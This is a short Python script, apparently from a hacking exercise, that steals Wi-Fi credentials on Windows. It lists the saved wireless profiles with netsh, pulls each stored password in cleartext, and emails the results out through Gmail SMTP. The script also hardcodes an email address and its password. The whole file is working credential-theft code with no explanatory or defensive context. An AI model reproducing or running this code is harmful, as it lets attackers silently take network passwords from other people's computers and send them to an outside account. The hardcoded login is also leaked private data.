  
#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
	print(network_name)
	# command = "netsh wlan show profile " + network_name + " key=clear"
	command = "netsh wlan show profile \"" + network_name + "\" key=clear"

	current_result = subprocess.check_output(command, shell=True)
	result = result + current_result


send_mail("dungeonmsterr@gmail.com", "Dungeon7&", result)
